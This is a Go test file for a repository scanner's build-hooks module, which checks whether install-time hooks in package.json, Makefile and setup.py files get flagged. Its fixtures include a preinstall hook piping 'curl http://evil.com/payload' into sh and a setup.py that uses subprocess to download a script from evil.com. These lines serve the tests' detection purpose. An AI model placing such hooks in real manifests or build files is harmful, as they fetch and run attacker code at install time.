package scanner_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/moldabekov/git-protect/internal/scanner"
)

func TestBuildHooks_NoBuildFiles(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "README.md"), []byte("# Hello"), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewBuildHooksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("got %d findings, want 0", len(findings))
	}
}

func TestBuildHooks_PackageJSONDangerousLifecycle(t *testing.T) {
	dir := t.TempDir()
	pkg := `{
  "name": "evil-pkg",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "curl http://evil.com/payload | sh",
    "test": "jest"
  }
}`
	if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(pkg), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewBuildHooksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for preinstall script, got none")
	}
	if findings[0].Severity != scanner.Medium {
		t.Errorf("severity = %v, want MEDIUM", findings[0].Severity)
	}
}

func TestBuildHooks_PackageJSONPostinstall(t *testing.T) {
	dir := t.TempDir()
	pkg := `{
  "name": "pkg",
  "scripts": {
    "postinstall": "node scripts/postinstall.js",
    "build": "tsc"
  }
}`
	if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(pkg), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewBuildHooksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for postinstall, got none")
	}
}

func TestBuildHooks_PackageJSONPrepare(t *testing.T) {
	dir := t.TempDir()
	pkg := `{
  "name": "pkg",
  "scripts": {
    "prepare": "husky install && node evil.js",
    "start": "node index.js"
  }
}`
	if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(pkg), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewBuildHooksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for prepare script, got none")
	}
}

func TestBuildHooks_PackageJSONSafeScripts(t *testing.T) {
	dir := t.TempDir()
	pkg := `{
  "name": "safe-pkg",
  "scripts": {
    "build": "tsc",
    "test": "jest",
    "start": "node dist/index.js",
    "lint": "eslint src/"
  }
}`
	if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(pkg), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewBuildHooksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("safe package.json got %d findings, want 0", len(findings))
	}
}

func TestBuildHooks_MakefileShellInvocation(t *testing.T) {
	dir := t.TempDir()
	makefile := "CC := gcc\nSRCS := $(shell find src -name '*.c')\nTARGET := app\n\nall: $(TARGET)\n\n$(TARGET): $(SRCS)\n\t$(CC) -o $@ $^\n"
	if err := os.WriteFile(filepath.Join(dir, "Makefile"), []byte(makefile), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewBuildHooksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for $(shell) in Makefile, got none")
	}
	if findings[0].Severity != scanner.Medium {
		t.Errorf("severity = %v, want MEDIUM", findings[0].Severity)
	}
}

func TestBuildHooks_MakefileSafe(t *testing.T) {
	dir := t.TempDir()
	makefile := "CC := gcc\nTARGET := app\n\nall: main.c\n\t$(CC) -o $(TARGET) main.c\n\nclean:\n\trm -f $(TARGET)\n"
	if err := os.WriteFile(filepath.Join(dir, "Makefile"), []byte(makefile), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewBuildHooksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("safe Makefile got %d findings, want 0", len(findings))
	}
}

func TestBuildHooks_SetupPySubprocess(t *testing.T) {
	dir := t.TempDir()
	setupPy := "from setuptools import setup\nimport subprocess\nsubprocess.call(['curl', 'http://evil.com/init.sh', '-o', '/tmp/init.sh'])\nsetup(name='evil-package', version='1.0.0')\n"
	if err := os.WriteFile(filepath.Join(dir, "setup.py"), []byte(setupPy), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewBuildHooksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for subprocess in setup.py, got none")
	}
}

func TestBuildHooks_SetupPySafe(t *testing.T) {
	dir := t.TempDir()
	setupPy := "from setuptools import setup, find_packages\nsetup(\n    name='my-package',\n    version='0.1.0',\n    packages=find_packages(),\n    install_requires=['requests'],\n)\n"
	if err := os.WriteFile(filepath.Join(dir, "setup.py"), []byte(setupPy), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewBuildHooksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("safe setup.py got %d findings, want 0", len(findings))
	}
}

func TestBuildHooks_Name(t *testing.T) {
	m := scanner.NewBuildHooksModule()
	if m.Name() != "build-hooks" {
		t.Errorf("Name() = %q, want %q", m.Name(), "build-hooks")
	}
}
